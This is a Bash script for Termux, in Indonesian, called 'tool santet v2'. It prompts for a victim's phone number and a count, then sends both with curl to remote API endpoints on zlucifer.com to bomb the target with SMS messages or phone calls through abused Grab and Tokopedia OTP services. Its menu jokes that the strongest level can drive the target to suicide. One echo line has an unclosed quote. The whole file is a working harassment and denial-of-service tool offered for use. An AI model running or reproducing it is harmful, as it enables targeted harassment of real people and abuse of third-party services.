#!/bin/bash
    sleep 0.03
    echo "     /  /            "
    sleep 0.03
    echo "   /  /              "
    sleep 0.03
    echo " /  /   |------------|"
    sleep 0.03
    echo "  \  \  |------------|"
    sleep 0.03
    echo "    \  \             "
    sleep 0.03
    echo "      \  \           "
    echo
    echo "=========================="
    sleep 0.03
    echo " TERMUX TERMINAL LINUX "
    echo "=========================="


    sleep 0.03
    echo " ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤ "
    sleep 2
    echo "  ©©     tool santet v2     ©©"
    sleep 0.4
    echo "  Author: Lilung"
    sleep 0.3
    echo "  Fanspage fb: lilung_project"
    sleep 0.5
    echo "  whatsapp: +6283824483217"
    sleep 0.7
    echo "  Instagram: lilung_project"
    sleep 0.7
    echo " ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤ "
load(){
    echo -e "\n"
    bar=" loading...................."
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=call)
mulai (){
    echo "MULAI MENGAKTIFKAN TOOL KEMBALI ?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Terimakasih telah menggunakan tool ini"
    fi
}
#spam
spam(){
    echo
    echo "[1] SANTET SMS"
    echo "[2] SANTET TELEPON"
    echo "[3] CREDIT"
    echo "[4] KELUAR"
    echo
    echo "1/2/3/4?"
    read pilih
    if [ $pilih = "1" ]; then
            echo "SANTET SMS"
            #function spam
            echo
            echo "Silahkan Tulis no hp target"
            echo contoh 083820000000
            read target # masukin no telp
            echo
            echo "Masukan jumlah santet ?"
            read paket
            echo
            echo Apakah nomor $target "dan Santet dikirim "$paket" sudah sesuai?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan Santet ke nomor $target
                    echo
                    echo "Jangan keluar dari ruang santet sebelum santet selesai dikirim nantinya bisa berbalik
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " jangan mengaku hacker kalau hanya pansos saja"
                    echo
                    echo " hacker kok pansos "
                    echo " -Lilung-"
                    echo "======================================="
            else
                    echo "ada kesalahan coba cek lagi"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "SANTET TELEPON"
            #function spam
            echo
            echo "Masukan no hp target"
            echo contoh 0812345678
            read target # masukin no telp
            echo
            echo "Gunakan Santet Grab/Toped?"
            echo "[1] GRAB (LEVEL TERTINGGI BISA BISA BUNUH DIRI)"
            echo "[2] TOPED (LEVEL LUMAYAN CUMA MASUK RS)"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan menggunakan jenis santet $api_spam "sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan santet call ke nomor $target
                  echo
                  echo "Jangan keluar  ruang santet sebelum santet selesai dikirim nantinya berbalik"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " ingat admin ini bukan hacker"
                  echo
                  echo " lebih baik belajar dari pada minta tolong di hackin "
                  echo " -Lilung-"
                  echo "========================================"
            else
                  echo Kesalahan, silahkan coba lagi
            fi
        mulai
echo
    elif [ $pilih = "3" ]; then
        echo "Author program: Lilung(rianto)"
        echo
        echo "support: All member HACKER DAN TUYUL TERMUX INDONESIA"
        echo
        echo "thanks untuk: "
        echo
        echo "-allah swt"
        echo
        echo "-pengguna termux"
        echo
        echo "-hacker pansos(sampah grup)"
        echo
        echo "-www.codesaya.com (tempat belajar coding atau belajar buat tool)"
        echo
        echo " udah itu aja nantikan tool lainnya "

    elif [ $pilih = "4" ]; then
        echo " Terimakasih sudah menggunakan Tool Santet v2"
        close
    else
        clear
        echo "Kesalahan coba cek lagi"
        mulai
    fi
}
close(){
    exit
}

echo "Mulai SANTET Orang?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
 
